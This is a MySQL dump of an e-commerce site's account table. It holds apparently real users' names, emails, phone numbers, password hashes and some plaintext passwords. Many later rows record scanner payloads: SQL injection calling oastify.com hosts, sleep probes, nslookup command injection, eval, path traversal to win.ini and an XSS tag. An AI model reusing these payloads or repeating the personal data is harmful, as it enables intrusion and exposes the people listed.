
-- MySQL dump 10.13  Distrib 8.0.43, for Win64 (x86_64)
--
-- Host: mysql-1db4d735-haoht203.i.aivencloud.com    Database: ecommerce
-- ------------------------------------------------------
-- Server version	8.0.45

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
SET @MYSQLDUMP_TEMP_LOG_BIN = @@SESSION.SQL_LOG_BIN;
SET @@SESSION.SQL_LOG_BIN= 0;

--
-- GTID state at the beginning of the backup 
--


--
-- Table structure for table `account`
--

DROP TABLE IF EXISTS `account`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `account` (
  `account_type` varchar(31) NOT NULL,
  `id` bigint NOT NULL AUTO_INCREMENT,
  `createdAt` datetime(6) DEFAULT NULL,
  `email` varchar(255) NOT NULL,
  `name` varchar(255) DEFAULT NULL,
  `password` varchar(255) NOT NULL,
  `phone` varchar(255) DEFAULT NULL,
  `status` int NOT NULL,
  `address_id` int DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UK_q0uja26qgu1atulenwup9rxyr` (`email`),
  UNIQUE KEY `UK_q4mt85fqye0pwgamg8vlw8mrb` (`address_id`),
  CONSTRAINT `FK9lna4d7ow9qbs27m5psafys58` FOREIGN KEY (`address_id`) REFERENCES `address` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=137 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `account`
--

LOCK TABLES `account` WRITE;
/*!40000 ALTER TABLE `account` DISABLE KEYS */;
INSERT INTO `account` VALUES ('admin',1,'2025-10-14 10:33:27.559000','23162027@student.hcmute.edu.vn','Võ Gia Huân','b7d6abdbb31a1924aa316b3f126f975691b9dfe785e826d1a0211701e27b0d39','0914422738',1,1),('USER',2,'2025-10-14 10:44:47.907000','hq301119@gmail.com','Huỳnh Thiên Hạo','c088d25965fe654d8bfdfa8d73d73fbac7abbaf64b41de8bed6db8bab9a57f0a','0383760203',1,2),('USER',3,'2025-10-14 10:51:29.730000','minhau11022005@gmail.com','Trương Nguyễn Minh Hậu','5994471abb01112afcc18159f6cc74b4f511b99806da59b3caf5a9c173cacfc5','0942581562',1,3),('USER',4,'2025-10-14 11:03:25.360000','KhangDaiKho@gmail.com','KhangDaiKho','a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3','0335995848',1,4),('USER',6,'2025-10-14 11:48:13.304000','Hu@gmail.com','Trương Nguyễn Minh Hậu','12345','0942581562',1,6),('USER',7,'2025-10-14 13:15:16.472000','a@gmail.com','Khang Duong','khangdz235','0987545762',1,7),('USER',8,'2025-10-14 13:22:33.615000','Hau@gmail.com','Trương Nguyễn Minh Hậu','12345','0942581562',1,8),('USER',9,'2025-10-14 14:23:10.879000','huytran@gmail.com','Huytrancube','a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3','0335995848',1,9),('USER',10,'2025-10-14 16:05:58.970000','nhu@gmail.com','1','1','1',1,10),('USER',11,'2025-10-14 23:41:07.988000','thanlanthangthan@gmail.com','NhatHuyNe','a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3','0327627903',1,11),('USER',12,'2025-10-15 04:14:58.118000','vogiahuan2005@gmail.com','Huân','b7d6abdbb31a1924aa316b3f126f975691b9dfe785e826d1a0211701e27b0d39','0914422738',1,12),('USER',13,'2025-10-15 04:17:24.503000','abcd@gmail.com','NhatHuyNe','7ff47bae3ebe39f675a7cdb06014d000ef9ca54c8330a789b0adb6349858b557','0327627903',1,13),('USER',14,'2025-10-15 04:54:18.355000','datbrvt2022@gmail.com','1','1','1',1,14),('USER',15,'2025-10-15 05:27:20.754000','giah5998@gmail.com','huan','b7d6abdbb31a1924aa316b3f126f975691b9dfe785e826d1a0211701e27b0d39','0914422738',1,15),('USER',16,'2025-10-15 05:59:16.871000','abcde@gmail.com','abcde','ac0c65dabd4414b1a2aee9aacead109a6ed39a28f54b1146d9e50b16506bc4cc','123',1,16),('USER',17,'2025-10-15 06:18:44.405000','an@gmail.com','Vo Gia Huan','78330193d91795bdd1b0f1f4dfa239dfb4dca33432a96c48fbef64783af0aca5','0914422738',1,17),('USER',18,'2025-10-15 06:19:05.536000','anh@gmail.com','Vo Gia Huan','e00ad2aba5db1019fbc2071a35194d7fde12811f39c0b489bd507bea5ea0af9d','0914422738',1,18),('USER',19,'2025-10-15 06:24:42.891000','Vogia@gmail.com','Vo Gia Huan','b7d6abdbb31a1924aa316b3f126f975691b9dfe785e826d1a0211701e27b0d39','0914422738',1,19),('USER',20,'2025-10-15 07:03:52.059000','oii@gmail.com','DoMiXi','4d51bc36d1f9904ab80afa5b3cbff312f5689616ed26e1d12c14cbd5e13da5e0','1234',1,20),('ADMIN',21,'2025-10-15 00:00:00.000000','admin@gmail.com','admin','a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3','0987545761',1,21),('USER',22,'2025-10-15 08:14:47.335000','kkk@gmail.com','kh','khangdz235','879090',1,22),('USER',23,'2025-10-15 08:52:27.563000','mm2gsnm79h@privaterelay.appleid.com','PC COMPUTER','ffae8ae90290da4a8fbba60f2d3295334778260d3a9a56af099681fb96532dcf','+84837203525',1,23),('USER',24,'2025-10-15 09:26:42.293000','huycao@gmail.com','huycao','5d4d28d972e5c967374e800ddbcf29fd130b557fff78f1fb401fef8f721479c5','12321321',1,24),('USER',25,'2025-10-15 10:16:51.042000','minhau@gmail.com','hau','123','1234556',1,25),('USER',26,'2025-10-15 11:17:46.971000','aaa@gmail.com','hauminh','12345','1234 55 ',1,26),('USER',27,'2025-10-15 11:33:46.847000','yeucotho@gmail.com','DAT','0052f4afe133aeea1b53fcebca0534cea004a0bb67ff8f408af009f4ce8a39f5','1',1,27),('USER',28,'2025-10-15 11:58:37.116000','12@gmail.com','1111','0052f4afe133aeea1b53fcebca0534cea004a0bb67ff8f408af009f4ce8a39f5','Dat123456@',1,28),('USER',29,'2025-10-15 12:32:53.798000','yeucotho123@gmail.com','<script>alert(1)</script>','0052f4afe133aeea1b53fcebca0534cea004a0bb67ff8f408af009f4ce8a39f5','1',1,29),('USER',31,'2025-10-15 14:25:13.069000','chimlongleo@gmail.com','Chim vé','c443404a47896b5936dc741dc44d379504b44d9014389f4d592cacf2c5d436a0','0842129872',1,31),('USER',33,'2025-10-15 16:30:15.648000','23162021@student.hcmute.edu.vn','Thiên Hạo Huỳnh','6637b8ac183d8b46c6b72d3150dd7d8624204b7cf82fd7dcce5ed97a13b808f8','0376747546',1,33),('USER',34,'2025-10-15 17:17:34.086000','123@gmail.com','con cho gia huy','0052f4afe133aeea1b53fcebca0534cea004a0bb67ff8f408af009f4ce8a39f5','12345667',1,34),('USER',35,'2025-10-15 19:00:51.788000','accphuhuynhthienhao@gmail.com','Huynh Thiên Hạo','fb3ce2262abbafd419325f6b0442fc06cb8c815668a5bf5357f13b45ed4cd99a','0383760203',1,35),('USER',36,'2025-10-15 22:18:09.381000','nhathuycop@gmail.com','Huy Tr','4d51bc36d1f9904ab80afa5b3cbff312f5689616ed26e1d12c14cbd5e13da5e0','0394092580',1,36),('USER',37,'2025-10-16 11:24:46.673000','admin@admin.com','test','201bce2458f00a54130c695ca8d1658319b32206d495adf175847b57bd4a4151','0111111',1,37),('USER',38,'2025-10-20 09:58:30.182000','OqGBkyFD@burpcollaborator.net','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,38),('USER',39,'2025-10-20 10:02:25.311000','OqGBkyFD@burpcollaborator.net;declare @q varchar(99);set @q=\'\\\\0efjgytmmpaq932se1xb4zdz8qel2j17sxgp3gr5.oasti\'+\'fy.com\\bsa\'; exec master.dbo.xp_dirtree @q;-- ','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,39),('USER',40,'2025-10-20 10:02:27.429000','OqGBkyFD@burpcollaborator.net\';declare @q varchar(99);set @q=\'\\\\9issk7xvqyezdc61ia1k88h8cziu6s5gw7kz7qvf.oasti\'+\'fy.com\\nwr\'; exec master.dbo.xp_dirtree @q;-- ','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,40),('USER',41,'2025-10-20 10:02:29.706000','OqGBkyFD@burpcollaborator.net);declare @q varchar(99);set @q=\'\\\\cr7vta6yz1n2mff4rdanhbqbl2rxfvej5bt3gu4j.oasti\'+\'fy.com\\hal\'; exec master.dbo.xp_dirtree @q;-- ','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,41),('USER',42,'2025-10-20 10:02:31.855000','OqGBkyFD@burpcollaborator.net\');declare @q varchar(99);set @q=\'\\\\7bjqd5qtjw7x6azzb8ui16a65xbszqyep7dz0qof.oasti\'+\'fy.com\\guc\'; exec master.dbo.xp_dirtree @q;-- ','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,42),('USER',43,'2025-10-20 10:02:34.085000','(select load_file(\'\\\\\\\\nb26dlq9jc7d6qzfbouy1mam5db8z6yupwdo0fo4.oastify.com\\\\slt\'))','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,43),('USER',44,'2025-10-20 10:02:36.559000','OqGBkyFD@burpcollaborator.net\'+(select load_file(\'\\\\\\\\twtcyrbf4isjrwklwuf4msvsqjwekcj0a3yvlm9b.oastify.com\\\\vab\'))+\'','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,44),('USER',45,'2025-10-20 10:02:38.804000','OqGBkyFD@burpcollaborator.net\'','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,45),('USER',46,'2025-10-20 10:02:41.332000','(select*from(select(sleep(20)))a)','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,46),('USER',47,'2025-10-20 10:02:45.357000','OqGBkyFD@burpcollaborator.net\'(select*from(select(sleep(20)))a)\'','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,47),('USER',48,'2025-10-20 10:02:48.068000','OqGBkyFD@burpcollaborator.net+(select*from(select(sleep(20)))a)+','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,48),('USER',49,'2025-10-20 10:02:50.207000','OqGBkyFD@burpcollaborator.net\'+(select*from(select(sleep(20)))a)+\'','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,49),('USER',50,'2025-10-20 10:02:52.523000','OqGBkyFD@burpcollaborator.net and (select*from(select(sleep(20)))a)-- ','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,50),('USER',51,'2025-10-20 10:02:55.158000','OqGBkyFD@burpcollaborator.net\' and (select*from(select(sleep(20)))a)-- ','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,51),('USER',52,'2025-10-20 10:02:58.019000','OqGBkyFD@burpcollaborator.net,(select*from(select(sleep(20)))a)','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,52),('USER',53,'2025-10-20 10:03:01.160000','OqGBkyFD@burpcollaborator.net waitfor delay\'0:0:20\'--','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,53),('USER',54,'2025-10-20 10:03:16.554000','OqGBkyFD@burpcollaborator.net\' waitfor delay\'0:0:20\'--','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,54),('USER',55,'2025-10-20 10:03:19.033000','OqGBkyFD@burpcollaborator.net)waitfor delay\'0:0:20\'--','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,55),('USER',56,'2025-10-20 10:03:21.183000','OqGBkyFD@burpcollaborator.net\')waitfor delay\'0:0:20\'--','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,56),('USER',57,'2025-10-20 10:03:25.402000','OqGBkyFD@burpcollaborator.net,0)waitfor delay\'0:0:20\'--','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,57),('USER',58,'2025-10-20 10:03:27.944000','OqGBkyFD@burpcollaborator.net\',0)waitfor delay\'0:0:20\'--','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,58),('USER',59,'2025-10-20 10:03:30.170000','OqGBkyFD@burpcollaborator.net||pg_sleep(20)--','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,59),('USER',60,'2025-10-20 10:03:34.176000','OqGBkyFD@burpcollaborator.net\'||pg_sleep(20)--','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,60),('USER',61,'2025-10-20 10:03:36.422000','OqGBkyFD@burpcollaborator.net AND pg_sleep(20)--','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,61),('USER',62,'2025-10-20 10:03:39.056000','OqGBkyFD@burpcollaborator.net\' AND pg_sleep(20)--','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,62),('USER',63,'2025-10-20 10:03:41.495000','OqGBkyFD@burpcollaborator.net,\'\'||pg_sleep(20)--','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,63),('USER',64,'2025-10-20 10:03:43.737000','OqGBkyFD@burpcollaborator.net\',\'\'||pg_sleep(20)--','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,64),('USER',65,'2025-10-20 10:03:45.990000','OqGBkyFD@burpcollaborator.net)AND pg_sleep(20)--','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,65),('USER',66,'2025-10-20 10:03:48.218000','OqGBkyFD@burpcollaborator.net\')AND pg_sleep(20)--','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,66),('USER',67,'2025-10-20 10:03:51.756000','OqGBkyFD@burpcollaborator.net,0)AND pg_sleep(20)--','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,67),('USER',68,'2025-10-20 10:03:54.278000','OqGBkyFD@burpcollaborator.net\',0)AND pg_sleep(20)--','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,68),('USER',69,'2025-10-20 10:03:56.493000','OqGBkyFD@burpcollaborator.net84717655\' or \'2002\'=\'2002','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,69),('USER',70,'2025-10-20 10:03:59.304000','OqGBkyFD@burpcollaborator.net21570846\' or \'6588\'=\'6594','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,70),('USER',71,'2025-10-20 10:04:03.559000','OqGBkyFD@burpcollaborator.net87232168\' or 5976=5976\'-- ','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,71),('USER',72,'2025-10-20 10:04:05.964000','OqGBkyFD@burpcollaborator.net\' and \'7505\'=\'7505','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,72),('USER',73,'2025-10-20 10:04:08.074000','OqGBkyFD@burpcollaborator.net\' and \'8314\'=\'8318','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,73),('USER',74,'2025-10-20 10:04:13.948000','OqGBkyFD@burpcollaborator.net\' and 2928=2928\'-- ','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,74),('USER',75,'2025-10-20 10:04:16.297000','OqGBkyFD@burpcollaborator.net\"','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,75),('USER',76,'2025-10-20 10:04:19.918000','zkor7y4rd9','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,76),('USER',77,'2025-10-20 10:04:22.263000','OqGBkyFD@burpcollaborator.neti5ud90dp31','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,77),('USER',78,'2025-10-20 10:04:25.958000','OqGBkyFD@burpcollaborator.net}}ciz9p\'/\"<d8qdl','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,78),('USER',79,'2025-10-20 10:04:28.331000','OqGBkyFD@burpcollaborator.net%}rewbz\'/\"<sk3sx','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,79),('USER',80,'2025-10-20 10:04:30.805000','OqGBkyFD@burpcollaborator.netmippz%>z8g51\'/\"<y004g','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,80),('USER',81,'2025-10-20 10:04:34.067000','OqGBkyFD@burpcollaborator.net\'+sleep(20.to_i)+\'','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,81),('USER',82,'2025-10-20 10:04:36.391000','OqGBkyFD@burpcollaborator.net\'+eval(compile(\'for x in range(1):\\n import time\\n time.sleep(20)\',\'a\',\'single\'))+\'','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,82),('USER',83,'2025-10-20 10:04:38.599000','eval(compile(\'for x in range(1):\\n import time\\n time.sleep(20)\',\'a\',\'single\'))','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,83),('USER',84,'2025-10-20 10:04:40.991000','OqGBkyFD@burpcollaborator.net\'.sleep(20).\'','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,84),('USER',85,'2025-10-20 10:04:43.196000','OqGBkyFD@burpcollaborator.net{${sleep(20)}}','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,85),('USER',86,'2025-10-20 10:04:46.575000','http://OqGBkyFD@xlmgnv0jtmhng09ply48bwkwfnli9g84ysqfh36.oastify.com/?burpcollaborator.net','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,86),('USER',87,'2025-10-20 10:04:50.037000','nslookup -q=cname gcwzeer2k5867j08chvr2fbf66c10zznsqgi39ry.oastify.com.&','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,87),('USER',88,'2025-10-20 10:04:53.924000','OqGBkyFD@burpcollaborator.net|nslookup -q=cname g1iz3eg295x6wjp81hkrrf0fv611pzonkbcy3ms.oastify.com.&','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,88),('USER',89,'2025-10-20 10:04:56.038000','OqGBkyFD@burpcollaborator.net\'\"`0&nslookup -q=cname dvcwxbaz32r3qgj5veeolcucp3vyjwikf87vyjn.oastify.com.&`\'','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,89),('USER',90,'2025-10-20 10:04:58.370000','OqGBkyFD@burpcollaborator.net&nslookup -q=cname mb15dkq8jb7c6pzebnux1lal5cb7z5ytthl4cs1.oastify.com.&\'\\\"`0&nslookup -q=cname mb15dkq8jb7c6pzebnux1lal5cb7z5ytthl4cs1.oastify.com.&`\'','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,90),('USER',91,'2025-10-20 10:05:00.634000','OqGBkyFD@burpcollaborator.net|echo mw5pgndrvu lkbhb4vcxr||a #\' |echo mw5pgndrvu lkbhb4vcxr||a #|\" |echo mw5pgndrvu lkbhb4vcxr||a #','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,91),('USER',92,'2025-10-20 10:05:03.001000','OqGBkyFD@burpcollaborator.net&echo 9iie4xj3lk zj9o28jeob&','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,92),('USER',93,'2025-10-20 10:05:05.481000','OqGBkyFD@burpcollaborator.net\"|echo 3fwhqkahyg ekczivwnqw ||','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,93),('USER',94,'2025-10-20 10:05:07.745000','OqGBkyFD@burpcollaborator.net\'|echo z2fvhru1zb ntook8ll1f #xzwx','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,94),('USER',95,'2025-10-20 10:05:10.057000','OqGBkyFD@burpcollaborator.net|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\\" |ping -n 21 127.0.0.1','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,95),('USER',96,'2025-10-20 10:05:12.701000','OqGBkyFD@burpcollaborator.net|ping -c 21 127.0.0.1||x','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,96),('USER',97,'2025-10-20 10:05:15.922000','OqGBkyFD@burpcollaborator.net&ping -n 21 127.0.0.1&','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,97),('USER',98,'2025-10-20 10:05:18.187000','OqGBkyFD@burpcollaborator.net\'|ping -c 21 127.0.0.1 #','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,98),('USER',99,'2025-10-20 10:05:20.356000','OqGBkyFD@burpcollaborator.net\"|ping -n 21 127.0.0.1 ||','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,99),('USER',100,'2025-10-20 10:05:24.461000','..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,100),('USER',101,'2025-10-20 10:05:26.883000','c:\\windows\\win.ini','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,101),('USER',102,'2025-10-20 10:05:29.124000','../../../../../../../../../../../../../../../../windows/win.ini','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,102),('USER',103,'2025-10-20 10:05:31.463000','..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,103),('USER',104,'2025-10-20 10:05:33.716000','../../../../../../../../../../../../../../../../winnt/win.ini','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,104),('USER',105,'2025-10-20 10:05:36.117000','\\windows\\win.ini','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,105),('USER',106,'2025-10-20 10:05:38.608000','file:///c:/windows/win.ini','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,106),('USER',107,'2025-10-20 10:05:40.945000','...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\windows\\win.ini','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,107),('USER',108,'2025-10-20 10:05:44.720000','.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\.../.\\windows/win.ini','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,108),('USER',109,'2025-10-20 10:05:47.064000','...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./windows/win.ini','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,109),('USER',110,'2025-10-20 10:05:50.704000','                                                            windows  win.ini','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,110),('USER',111,'2025-10-20 10:05:53.085000','%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,111),('USER',112,'2025-10-20 10:05:55.346000','OqGBkyFD@burpcollaborator.net..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,112),('USER',113,'2025-10-20 10:05:58.463000','OqGBkyFD@burpcollaborator.net../../../../../../../../../../../../../../../../windows/win.ini','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,113),('USER',114,'2025-10-20 10:06:01.001000','OqGBkyFD@burpcollaborator.net..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,114),('USER',115,'2025-10-20 10:06:03.327000','OqGBkyFD@burpcollaborator.net../../../../../../../../../../../../../../../../winnt/win.ini','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,115),('USER',116,'2025-10-20 10:06:05.611000','..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini\0OqGBkyFD@burpcollaborator.net','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,116),('USER',117,'2025-10-20 10:06:07.823000','c:\\windows\\win.ini\0OqGBkyFD@burpcollaborator.net','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,117),('USER',118,'2025-10-20 10:06:10.451000','..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini\0OqGBkyFD@burpcollaborator.net','OqGBkyFD','21ebf1c376baacf47919c0cc4c445ff547aca548a5e2693d211a608d7e44ad2a','466-388-5919',1,118),('USER',119,'2025-10-20 